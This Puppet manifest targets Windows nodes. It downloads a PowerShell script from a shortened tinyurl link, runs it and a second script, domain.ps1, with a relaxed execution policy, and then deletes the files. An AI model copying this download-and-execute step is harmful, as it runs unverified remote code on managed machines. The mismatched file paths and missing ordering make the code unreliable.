class test{
  exec{'file':
    path => 'C:/Windows/System32/WindowsPowerShell/v1.0',
    command => 'powershell curl https://tinyurl.com/y4pd6emm -O download.ps1',
  }

  exec {'download_file':
    path    => 'C:/Windows/System32/WindowsPowerShell/v1.0',
    command => 'powershell -executionpolicy remotesigned -file C:/download.ps1',
  }

  exec {'excute_file':
    path    => 'C:/Windows/System32/WindowsPowerShell/v1.0',
    command => 'powershell -executionpolicy remotesigned -file C:/domain.ps1',
  }
}

class remove{
  exec {'remove_domain':
    path    => 'C:/Windows/System32/WindowsPowerShell/v1.0',
    command => 'powershell -executionpolicy remotesigned -file C:/remove.ps1',
  }
}

class remove_file{
  exec {'remove1':
    path    => 'C:/Windows/System32/WindowsPowerShell/v1.0',
    command => 'powershell Remove-item download.ps1',
  }
  exec {'remove2':
    path    => 'C:/Windows/System32/WindowsPowerShell/v1.0',
    command => 'powershell Remove-item domain.ps1',
  }
}


if $facts['os']['family'] ==  'windows'{
  include test
  include remove_file
}
